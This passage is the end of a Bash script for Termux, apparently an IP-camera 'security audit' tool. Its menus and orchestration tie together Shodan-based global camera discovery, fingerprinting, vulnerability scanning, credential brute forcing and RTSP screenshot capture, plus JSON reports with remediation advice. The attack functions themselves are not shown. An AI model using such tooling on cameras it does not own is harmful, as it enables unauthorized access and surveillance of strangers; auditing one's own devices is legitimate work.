        'os_guess': '${os_guess}'
    },
    'vulnerabilities': ${vulns_json},
    'credentials': ${creds_json},
    'screenshot': {
        'captured': '${screenshot_file}' != '',
        'file_path': '${screenshot_file}',
        'base64_preview': '${screenshot_b64}'
    },
    'remediation': [
        'Change default passwords immediately',
        'Update firmware to latest version',
        'Disable unused services and ports',
        'Enable HTTPS/TLS',
        'Implement VLAN segmentation',
        'Use strong, unique passwords',
        'Enable RTSP authentication'
    ],
    'risk_score': len(${vulns_json}) * 2.5 + (1.5 if '${onvif}' == 'Yes' else 0)
}
print(json.dumps(report, indent=2))
" > "$json_report" 2>/dev/null
    
    echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║  JSON REPORT EXPORTED                        ║${NC}"
    echo -e "${GREEN}║  File: ${WHITE}${json_report}${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
    
    log "INFO" "JSON report exported: $json_report"
    
    # Output to stdout for piping to Python
    if [[ "$JSON_OUTPUT" == "true" ]]; then
        cat "$json_report"
    fi
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              FULL AUDIT (All-in-one, optimized flow)                 ║
# ╚══════════════════════════════════════════════════════════════════════╝
full_audit() {
    clear
    echo -e "$BANNER"
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║            FULL SECURITY AUDIT               ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Check for Shodan export
    local shodan_export="$SCRIPT_DIR/.shodan_export"
    local target=""
    
    if [[ -f "$shodan_export" ]]; then
        target=$(cat "$shodan_export")
        echo -e "${YELLOW}[*] Using Shodan-exported target: ${target}${NC}"
        rm "$shodan_export"
    else
        read -p "Enter target IP (or 'scan' to discover): " target
    fi
    
    if [[ "$target" == "scan" ]]; then
        echo -e "${YELLOW}[*] Discovering cameras on network...${NC}"
        local hosts=($(discover_hosts))
        echo -e "${GREEN}[+] Found ${#hosts[@]} hosts${NC}"
        
        for host in "${hosts[@]}"; do
            local port80=$(nmap -p 80 --open "$host" 2>/dev/null | grep -c "open")
            local port554=$(nmap -p 554 --open "$host" 2>/dev/null | grep -c "open")
            
            if [[ $port80 -gt 0 ]] || [[ $port554 -gt 0 ]]; then
                echo -e "\n${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                echo -e "${BOLD}  Auditing: ${YELLOW}${host}${NC}"
                echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                fingerprint_camera "$host" | grep -E "VENDOR:|MODEL:|SERVER:|ONVIF:" | sed 's/^/  /'
                scan_vulnerabilities "$host"
                bruteforce_camera "$host"
                export_json_report "$host"
            fi
        done
    elif [[ -n "$target" ]]; then
        fingerprint_camera "$target" | grep -E "VENDOR:|MODEL:|SERVER:|ONVIF:" | sed 's/^/  /'
        scan_vulnerabilities "$target"
        bruteforce_camera "$target"
        export_json_report "$target"
    fi
    
    # Generate summary report
    local report="$REPORT_DIR/audit_$(date +%Y%m%d_%H%M%S).txt"
    {
        echo "CAM-SEC PRO v2.1 Audit Report"
        echo "Date: $(date)"
        echo "Target(s): ${target:-Auto-discovered}"
        echo "═══════════════════════════════════"
        echo "JSON Reports: $JSON_DIR/"
        echo "Screenshots: $SCREENSHOT_DIR/"
        echo ""
        echo "Recent Logs:"
        tail -50 "$LOG_DIR/scanner.log"
    } > "$report"
    echo -e "\n${GREEN}[✓] Report saved: ${report}${NC}"
    
    log "INFO" "Full audit completed"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              SINGLE TARGET SCAN                                     ║
# ╚══════════════════════════════════════════════════════════════════════╝
single_scan() {
    clear
    echo -e "$BANNER"
    read -p "Enter target IP: " ip
    [[ -z "$ip" ]] && return
    
    echo -e "${YELLOW}[*] Fingerprinting...${NC}"
    fingerprint_camera "$ip" | grep -E "VENDOR:|MODEL:|SERVER:|ONVIF:|OPEN_PORTS:" | sed 's/^/  /'
    
    echo -e "\n${YELLOW}[*] Scanning vulnerabilities...${NC}"
    scan_vulnerabilities "$ip"
    
    echo -e "\n${YELLOW}[*] Testing credentials...${NC}"
    bruteforce_camera "$ip"
    
    echo -e "\n${YELLOW}[*] Exporting JSON report...${NC}"
    export_json_report "$ip"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              SETTINGS MENU (v2.1 NEW)                                ║
# ╚══════════════════════════════════════════════════════════════════════╝
settings_menu() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              SETTINGS                        ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    
    load_config
    
    echo -e "${WHITE}Current Configuration:${NC}"
    echo -e "  ${CYAN}[1]${NC} Shodan API Key: ${YELLOW}${SHODAN_API_KEY:-Not Set}${NC}"
    echo -e "  ${CYAN}[2]${NC} JSON Auto-Export: ${YELLOW}${JSON_OUTPUT}${NC}"
    echo -e "  ${CYAN}[3]${NC} RTSP Screenshot Capture: ${YELLOW}${SCREENSHOT_ENABLED}${NC}"
    echo -e "  ${CYAN}[0]${NC} Back to Main Menu"
    echo ""
    read -p "Toggle setting > " setting_choice
    
    case $setting_choice in
        1)
            read -p "Enter Shodan API Key: " SHODAN_API_KEY
            save_config
            echo -e "${GREEN}[✓] API Key updated${NC}"
            ;;
        2)
            [[ "$JSON_OUTPUT" == "true" ]] && JSON_OUTPUT="false" || JSON_OUTPUT="true"
            save_config
            echo -e "${GREEN}[✓] JSON Export: ${JSON_OUTPUT}${NC}"
            ;;
        3)
            [[ "$SCREENSHOT_ENABLED" == "true" ]] && SCREENSHOT_ENABLED="false" || SCREENSHOT_ENABLED="true"
            save_config
            echo -e "${GREEN}[✓] Screenshot Capture: ${SCREENSHOT_ENABLED}${NC}"
            ;;
    esac
    
    sleep 1
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              MAIN MENU                                              ║
# ╚══════════════════════════════════════════════════════════════════════╝
main_menu() {
    load_config
    
    while true; do
        clear
        echo -e "$BANNER"
        echo -e "${WHITE}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${WHITE}║              MAIN MENU                       ║${NC}"
        echo -e "${WHITE}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${CYAN}[${WHITE}1${CYAN}] ${WHITE}Full Audit${NC}              - Auto-discover + full scan + JSON"
        echo -e "  ${CYAN}[${WHITE}2${CYAN}] ${WHITE}Single Target Scan${NC}      - Deep scan one IP + screenshot"
        echo -e "  ${CYAN}[${WHITE}3${CYAN}] ${WHITE}Fingerprint Only${NC}        - Identify camera vendor/model"
        echo -e "  ${CYAN}[${WHITE}4${CYAN}] ${WHITE}Vulnerability Scan${NC}     - CVE check + RTSP capture"
        echo -e "  ${CYAN}[${WHITE}5${CYAN}] ${WHITE}Credential Test${NC}        - Brute force only"
        echo -e "  ${CYAN}[${WHITE}6${CYAN}] ${WHITE}RTSP Screenshot${NC}         - Capture frame from stream"
        echo -e ""
        echo -e "  ${MAGENTA}[${WHITE}7${MAGENTA}] ${WHITE}Shodan Search${NC}          - Global camera discovery"
        echo -e "  ${MAGENTA}[${WHITE}8${MAGENTA}] ${WHITE}Export JSON Report${NC}     - Generate structured JSON"
        echo -e ""
        echo -e "  ${CYAN}[${WHITE}9${CYAN}] ${WHITE}Settings${NC}               - Configure API keys & options"
        echo -e "  ${CYAN}[${WHITE}10${CYAN}]${WHITE}Install Dependencies${NC}   - Setup required tools"
        echo -e "  ${CYAN}[${WHITE}0${CYAN}] ${RED}Exit${NC}"
        echo ""
        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${RED}  ⚠ Use ONLY on your own devices!${NC}"
        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo ""
        read -p "  Choice > " choice
        
        case $choice in
            1) full_audit ;;
            2) single_scan ;;
            3) read -p "IP: " ip; fingerprint_camera "$ip" | grep -E "VENDOR:|MODEL:|SERVER:" | sed 's/^/  /' ;;
            4) read -p "IP: " ip; scan_vulnerabilities "$ip" ;;
            5) read -p "IP: " ip; bruteforce_camera "$ip" ;;
            6)
                read -p "IP: " ip
                read -p "Port [554]: " port; port=${port:-554}
                read -p "Path [/live]: " path; path=${path:-/live}
                capture_rtsp_screenshot "$ip" "$port" "$path"
                ;;
            7) shodan_search ;;
            8) read -p "IP: " ip; export_json_report "$ip" ;;
            9) settings_menu ;;
            10) setup_deps ;;
            0) 
                clear
                echo -e "${GREEN}╔══════════════════════════════════════╗${NC}"
                echo -e "${GREEN}║  CAM-SEC PRO v2.1 - Shutting Down    ║${NC}"
                echo -e "${GREEN}║  Logs:    ${LOG_DIR}${NC}"
                echo -e "${GREEN}║  Reports: ${REPORT_DIR}${NC}"
                echo -e "${GREEN}║  JSON:    ${JSON_DIR}${NC}"
                echo -e "${GREEN}║  Shots:   ${SCREENSHOT_DIR}${NC}"
                echo -e "${GREEN}╚══════════════════════════════════════╝${NC}"
                log "INFO" "CAM-SEC PRO v2.1 stopped"
                exit 0 
                ;;
            *) echo -e "${RED}[!] Invalid choice${NC}"; sleep 1 ;;
        esac
        
        [[ "$choice" != "0" ]] && { echo ""; read -p "Press Enter to continue..."; }
    done
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              STARTUP CHECK                                          ║
# ╚══════════════════════════════════════════════════════════════════════╝
if [[ ! -d "/data/data/com.termux" ]]; then
    echo -e "${RED}[!] This script requires Termux (Android)${NC}"
    exit 1
fi

log "INFO" "CAM-SEC PRO v2.1 started"
main_menu
